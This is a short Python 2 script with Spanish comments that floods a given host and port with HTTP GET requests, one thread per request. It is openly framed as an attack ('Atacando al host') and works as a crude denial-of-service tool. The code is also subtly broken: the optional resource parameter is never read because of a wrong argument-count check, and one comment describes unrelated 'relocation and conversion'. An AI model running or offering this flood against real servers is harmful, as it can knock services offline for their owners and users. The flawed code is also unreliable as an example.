# coding=utf-8
#Este código recibe 4 parámetros: [1] el host sin http, [2] el puerto, [3] la cantidad de peticiones y [4] información
#Los primeros 3 parámetros son indispensables, el 4 es opcional
"""
FUNCIONALIDAD:
Realiza peticiones GET por http. Depende de PySockets
"""

import socket, sys, os
import threading

def attack(url, puerto, recurso, numPeticion):
    #pid = os.fork()
    #Hace la conección
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Pasa el host y el puerto para hacer el ataque
    s.connect((url, int(puerto)))
    #Imprime los datos envíados
    if recurso != "":
        print ">> GET /" + str(recurso) + " HTTP/1.1 ::: numero: " + str(numPeticion)
        #Hace el envío de las peticiones
        s.send("GET /" + recurso + " HTTP/1.1\r\n")
        s.send("Host: " + url + "\r\n\r\n")
    else:
        print ">> GET / HTTP/1.1"
        #Hace el envío de las peticiones
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: " + url  + "\r\n\r\n")
    #cierra el servidor
    s.close()

def main():
    if len(sys.argv) <= 3:
        print "Este script requiere al menos 3 parámetros"
    else:
        url = sys.argv[1]
        puerto = sys.argv[2]
        numPeticiones = sys.argv[3]
        recurso = ""
        if len(sys.argv) < 3:
            recurso = sys.argv[4]

        print ">>>>> Atacando al host " + url
        print "Puerto " + puerto
        print "Recurso " + recurso + "\n"
        #Crea el pull de hilos
        threads = list()
        for i in range(0, int(numPeticiones)):
            #Lanza el proceso de reubicación y conversión en un hilo
            t = threading.Thread(target=attack, args=(url, puerto, recurso, i,))
            #Inicia y lanza el hilo
            threads.append(t)
            t.start()

if __name__ == '__main__': main()